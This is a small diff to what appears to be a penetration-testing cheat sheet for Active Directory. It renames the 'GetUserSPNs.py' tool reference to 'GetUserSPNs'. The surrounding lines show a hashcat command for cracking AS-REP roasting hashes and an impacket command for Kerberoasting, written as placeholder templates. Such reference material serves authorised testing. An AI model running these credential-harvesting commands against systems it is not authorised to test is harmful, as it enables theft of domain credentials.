@@ -5886,7 +5886,7 @@ or
 > hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
 > ```
 
-- Kerberoasting: use GetUserSPNs.py to extract SPNs.
+- Kerberoasting: use GetUserSPNs to extract SPNs.
 > ```bash
 > impacket-GetUserSPNs <domain>/<username>:<password> -dc-ip <dc-ip>
 > ```
